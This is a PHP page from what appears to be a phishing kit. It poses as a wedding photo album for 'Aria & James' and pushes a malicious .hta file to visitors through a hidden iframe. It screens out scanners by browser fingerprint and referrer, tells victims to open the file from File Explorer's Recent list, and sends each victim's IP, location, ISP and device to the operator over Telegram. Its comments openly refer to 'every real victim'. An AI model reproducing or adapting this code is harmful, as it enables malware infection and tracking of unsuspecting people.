<?php
require __DIR__ . '/../lib.php';

// Step 3: must arrive from download.php, full Chrome fingerprint.
// The load is scripted (2s spinner setTimeout), so Chrome sends
// Sec-Fetch-User: ?0 even for a human click — requireUser must stay
// false here or every real victim 404s. Pacing is enforced by minAge.
gate_doc(['/download.php'], 4, false);

$name = (string)($_GET['n'] ?? '');
if ($name === '' || preg_match('/[^A-Za-z0-9_. -]/', $name)) { $name = make_name(); }
$name = substr($name, 0, 90);
if (!str_ends_with($name, '.hta')) { $name .= '.hta'; }
$tok  = check_token($_GET['tk'] ?? null);

$tk    = rawurlencode($_GET['tk']);
$nameQ = rawurlencode($name);

// Points at Windows 11 File Explorer "Recent", where fresh downloads land first.
$instr = 'Find <strong>' . htmlspecialchars($name) . '</strong> in <strong>Recent</strong> (File Explorer) and open it to view the album.';

// ---- one Telegram alert per visit (deduped by token nonce) ----
$key = ALERT_DIR . '/al_' . md5($tok['r'] . '|' . $name) . '.fired';
if (!@file_exists($key)) {
    @touch($key);
    $g   = geo(ip());
    $msg = "\x{1F48D} New Album Opened \x{1F48D}\n"
         . "\x{1F4C5} Time: " . date('Y-m-d H:i:s') . "\n"
         . "\x{1F4CD} IP: " . ip() . "\n"
         . "\x{1F30D} Location: " . $g['city'] . ", " . $g['country'] . "\n"
         . "\x{1F310} ISP: " . $g['isp'] . "\n"
         . "\x{1F4C1} File: " . $name . "\n"
         . "\x{1F4F1} Device: " . ua()
         . verdict_line($tok);
    tg($msg);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow">
  <title>Photo Album</title>
  <style>
    body {
      font-family: "Segoe UI", Tahoma, sans-serif; margin: 0; height: 100vh;
      display: flex; align-items: flex-start; justify-content: center;
      background-color: #0e0e0e; color: #d9d1bf; padding-top: 12vh;
    }
    .container { text-align: center; max-width: 560px; }
    .rings { width: 70px; margin: 0 auto 18px auto; display: block; }
    a { color: #c9a86a; text-decoration: none; font-weight: 600; }
    a:hover { text-decoration: underline; }
    p { line-height: 1.7; margin: 0; padding: 0 12px; }
    .title { font-family: Georgia, "Times New Roman", serif; font-size: 26px;
      letter-spacing: 2px; color: #efe6d2; margin-bottom: 14px; }
  </style>
</head>
<body>
  <div class="container">
    <svg class="rings" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
      <circle cx="38" cy="54" r="26" fill="none" stroke="#c9a86a" stroke-width="7"/>
      <circle cx="62" cy="46" r="26" fill="none" stroke="#a8894e" stroke-width="7"/>
    </svg>
    <div class="title">Aria &amp; James &mdash; Our Wedding</div>
    <p>Sorry, the album could not be opened automatically.<br>
    Let's finish opening it.<br><br>
    <?php echo $instr; ?> <a href="dl.php?tk=<?php echo $tk; ?>&n=<?php echo $nameQ; ?>">Download the album again</a>.<br><br>
    Not working? <a href="#">&#8635; Restart and open | Get Help</a></p>
  </div>

  <!-- Hidden iframe to trigger the actual (fresh-name, unique-hash) download.
       Sec-Fetch-Dest: iframe, no Sec-Fetch-User — exactly what gate_dl() expects. -->
  <iframe src="dl.php?tk=<?php echo $tk; ?>&n=<?php echo $nameQ; ?>" style="display:none;" onload="this.remove();"></iframe>
</body>
</html>
